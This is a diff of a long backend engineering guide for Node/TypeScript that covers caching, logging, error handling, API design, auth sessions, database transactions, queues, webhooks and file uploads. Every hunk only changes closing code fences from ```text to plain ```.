 #### Real Fix 2: Stale-While-Revalidate
 
@@ -5474,7 +5450,7 @@ async function refreshCache(key, fetchFn, ttl) {
   }
 }
 
-```text
+```
 
 #### Real Fix 3: TTL Jitter (Prevent Simultaneous Expiry)
 
@@ -5495,7 +5471,7 @@ function setWithJitter(
 // With jitter: Items expire between 4 and 6 mins
 // Prevents stampede from synchronized expiry
 
-```text
+```
 
 ---
 
@@ -5556,13 +5532,13 @@ app.get('/api/user/profile',
   profileHandler
 );
 
-```text
+```
 
 ---
 
 ### DECISION TREE: CACHING STRATEGY
 
-```text
+```
 CACHING DECISION
 
 +- What to cache?
@@ -5589,7 +5565,7 @@ CACHING DECISION
     +- TTL jitter ? Randomize expiration
     +- Cache warming ? Preload before expiry
 
-```text
+```
 
 ---
 
@@ -5634,7 +5610,7 @@ logger.info({
 // Output: {"level":"info","event":"purchase_completed","userId":"123",...}
 // Now you can query: event=purchase_completed AND amount>50
 
-```text
+```
 
 ---
 
@@ -5670,7 +5646,7 @@ sdk.start();
 // - PostgreSQL queries
 // - Redis commands
 
-```text
+```
 
 ---
 
@@ -5699,7 +5675,7 @@ const logger = pino({
 // {"level":"info","message":"Processing order","traceId":"abc123","spanId":"xyz789"}
 // Click traceId in your observability tool ? see full request flow
 
-```text
+```
 
 ---
 
@@ -5720,7 +5696,7 @@ const logGuidelines = {
 // - Staging: info
 // - Production: info or warn
 
-```text
+```
 
 ---
 
@@ -5788,7 +5764,7 @@ const result = await withRetry(
   }
 );
 
-```text
+```
 
 ---
 
@@ -5883,7 +5859,7 @@ const result = await paymentCircuit.execute(
   }
 );
 
-```text
+```
 
 ---
 
@@ -5925,13 +5901,13 @@ async function getProductWithRecommendations(productId: string) {
   };
 }
 
-```text
+```
 
 ---
 
 ### DECISION TREE: ERROR HANDLING
 
-```text
+```
 ERROR HANDLING DECISION
 
 +- Is error retryable?
@@ -5959,7 +5935,7 @@ ERROR HANDLING DECISION
     +- Alert on error rate thresholds
     +- Track circuit breaker state changes
 
-```text
+```
 
 ---
 
@@ -5999,7 +5975,7 @@ function error(code: string, message: string, details?: Record<string, any>): Ap
   return { success: false, data: null, error: { code, message, details } };
 }
 
-```text
+```
 
 ---
 
@@ -6028,7 +6004,7 @@ app.use('/api/v1', (req, res, next) => {
   next();
 });
 
-```text
+```
 
 ---
 
@@ -6097,7 +6073,7 @@ async function paginateWithOffset<T>(
   };
 }
 
-```text
+```
 
 ---
 
@@ -6146,7 +6122,7 @@ function validate<T extends z.ZodSchema>(schema: T) {
 app.post('/users', validate(createUserSchema), createUser);
 app.patch('/users/:id', validate(updateUserSchema), updateUser);
 
-```text
+```
 
 ---
 
@@ -6194,7 +6170,7 @@ const tieredLimiter = rateLimit({
   keyGenerator: (req) => req.user?.id || req.ip,
 });
 
-```text
+```
 
 ---
 
@@ -6270,7 +6246,7 @@ async function refreshAccessToken(refreshToken: string) {
   }
 }
 
-```text
+```
 
 ---
 
@@ -6312,7 +6288,7 @@ async function invalidateAllSessions(userId: string) {
   }
 }
 
-```text
+```
 
 ---
 
@@ -6354,7 +6330,7 @@ async function query<T>(sql: string, params?: any[]): Promise<T[]> {
   }
 }
 
-```text
+```
 
 ---
 
@@ -6394,7 +6370,7 @@ const result = await withTransaction(async (client) => {
   return user.rows[0];
 });
 
-```text
+```
 
 ---
 
@@ -6457,7 +6433,7 @@ await emailQueue.add('daily-report', {}, {
   repeat: { cron: '0 9 * * *' } // Daily at 9 AM
 });
 
-```text
+```
 
 ---
 
@@ -6515,7 +6491,7 @@ async function deliverWebhook(
   await logWebhookDelivery(config.url, event, 'failed', 'max_retries');
 }
 
-```text
+```
 
 ---
 
@@ -6560,7 +6536,7 @@ app.post('/upload', upload.single('file'), async (req, res) => {
   res.json({ url: `https://${process.env.S3_BUCKET}.s3.amazonaws.com/${key}` });
 });
 
-```text
+```
 
 ---
 
@@ -6590,7 +6566,7 @@ app.get('/download/:key', async (req, res) => {
   }
 });
 
-```text
+```
 
 ---
 
@@ -6620,7 +6596,7 @@ app.get('/export/users', async (req, res) => {
   res.send(csv);
 });
 
-```text
+```
 
 ---
 
